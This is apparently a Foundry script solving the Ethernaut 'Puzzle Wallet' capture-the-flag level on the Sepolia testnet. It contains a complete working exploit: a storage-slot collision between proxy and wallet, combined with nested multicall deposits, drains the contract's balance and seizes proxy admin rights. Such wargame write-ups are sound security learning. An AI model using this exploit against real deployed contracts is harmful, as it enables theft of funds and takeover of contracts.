// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/PuzzleWallet.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

// Define an interface for better interaction with the PuzzleProxy contract
interface IProxyAndWallet {
    function pendingAdmin() external view returns (address);
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
    function whitelisted(address addr) external view returns (bool);
}


contract    PuzzleWalletSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("PUZZLE_WALLET_INSTANCE"));
    address public myAddress = payable(vm.envAddress("MY_ADDRESS"));


    /*  Attack idea:
        The Puzzle proxy has some storage collision with the PuzzleWallet contract. 
        Notice that the Puzzle proxy has in storage slot 0 and 1 
        address public pendingAdmin;
        address public admin;
        while the PuzzleWallet contract has in storage slot 0 and 1
        address public owner;
        uint256 public maxBalance;

        So we want to change the maxBalance in order to be the admin of the Puzzle proxy
        notice that the contract is deployed with 0.001 ETH that we will end up with after the attack

        Notice that we fisrt propose a new admin as our address => this change the slot 0 in the storage, 
        making us the owner of the Puzzle Wallet => we need to be part of the whitelist 
        => then we can set up the new maxBalance in which we are going to set to match our address
        successfully changing the admin of the Puzzle proxy
        But in the setMaxBalance function we need to have the contract balance to be 0
        THE KEY is to use the multicall function to deposit more than we send
        in the multicall function it uses delegatecall
        so we have proxy => delegatecall => PuzzleWallet => multicall => delegatecall => PuzzleWallet
        when we use delegatecall the context is preserved through the call chain
        and the state variable of the proxy is changed

        notice that the multicall has a check for deposit so we can't just wrap two deposit calls
        in order to deposit one time and be registered as a double deposit we need to fisrt deposit => 
        then call the multicall function => then deposit again

        the calldata will be: deposit + multicall(deposit)
        since the check for deposit is reset each time when we call the multicall function
        this able us the update our balance twice
        So we can send 0.001 ETH and have a balance of 0.002 ETH to drain the contract
    */

    function run() external {
        vm.startBroadcast(deployerPrivateKey);
        
        // propose a new admin as our address
        IProxyAndWallet puzzleProxyInstance = IProxyAndWallet(instance);
        puzzleProxyInstance.proposeNewAdmin(myAddress);
        console.log("Current admin: ", puzzleProxyInstance.admin());
        console.log("Pending admin: ", puzzleProxyInstance.pendingAdmin());

        // since we are the owner of the PuzzleWallet contract we can add ourselves to the whitelist
        puzzleProxyInstance.addToWhitelist(myAddress);
        console.log("Whitelisted: ", puzzleProxyInstance.whitelisted(myAddress));

        // drain the contract by depositing 0.001 ETH and have a balance of 0.002 ETH
        // the calldata will be: deposit + multicall(deposit)
        bytes[] memory depositEncoded = new bytes[](1);
        depositEncoded[0] = abi.encodeWithSignature("deposit()");

        // data[0] = deposit, data[1] = multicall(deposit)
        bytes[] memory data = new bytes[](2);
        data[0] = depositEncoded[0];
        data[1] = abi.encodeWithSignature("multicall(bytes[])", depositEncoded);

        // the first call will be deposit
        // the second call will be multicall(deposit)
        // it will delegatecall with (multicall(deposit))
        // it will enter the mullticall with the data as deposit
        // it will delegatecall with deposit

        puzzleProxyInstance.multicall{value: 0.001 ether}(data);
        console.log("Balance: ", address(puzzleProxyInstance).balance);
        puzzleProxyInstance.execute(myAddress, 0.002 ether, "");
        console.log("Balance after attack: ", address(puzzleProxyInstance).balance);

        // set the maxBalance to be our address to be the admin of the Puzzle proxy
        puzzleProxyInstance.setMaxBalance(uint256(uint160(myAddress)));

        console.log("New admin: ", puzzleProxyInstance.admin());
        require(puzzleProxyInstance.admin() == myAddress, "Failed to change the admin");

        vm.stopBroadcast();

    }

}